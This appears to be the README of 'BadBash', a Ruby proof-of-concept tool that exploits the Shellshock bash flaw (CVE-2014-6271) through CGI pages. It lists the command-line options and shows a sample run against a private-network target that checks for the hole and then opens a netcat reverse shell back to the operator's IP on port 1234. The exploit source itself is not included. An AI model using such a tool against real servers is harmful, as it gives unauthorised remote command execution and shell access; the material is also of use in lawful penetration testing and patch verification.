BadBash
=======

CVE-2014-6271 (ShellShock) RCE PoC tool 

=======
BadBash is a CVE-2014-6271 RCE exploit tool. The basic version only checks for the HTTP CGI site and only provides netcat reverse shell on port 1234.

Developer : Andy Yang 
Version : 0.1.0 
License : GPLv3

================================================================================================
RainMak3r@Could:~/Desktop# ruby BadBash.rb  -h

BadBash - CVE-2014-6271 RCE tool by Andy Yang
Basic version only checks for HTTP site
Basic version only provides netcat reverse shell on port 1234


EXAMPLE USAGE:

     ./BBash.rb  -t 'www.target.com/cgi-folder/cgi.sh' -d '127.0.0.1'
     ./BBash.rb  -t '10.0.0.1/cgi-folder/cgi.sh' -d '127.0.0.1'
    -t, --Target CGI path            Full path of CGI page
    -d, --Destination IP             Your IP address that listen to an inbound connection
    -h, --help                       Display help

================================================================================================
Example of usage.
================================================================================================
RainMak3r@Could:~/Desktop#ruby BadBash.rb -t '172.16.235.140/cgi-bin/Andy.sh' -d '172.16.189.1'

[Info]     Checking if the target is vulnerable........

[Info]     This may take up to 10 seconds........

[Info]     Target is vulnerable!!!

[Info]     Please use NC to listen on port 1234 for reverse shell..........

[Info]     Exploiting for a reverse shell to connect 172.16.189.1:1234 via netcat ..........



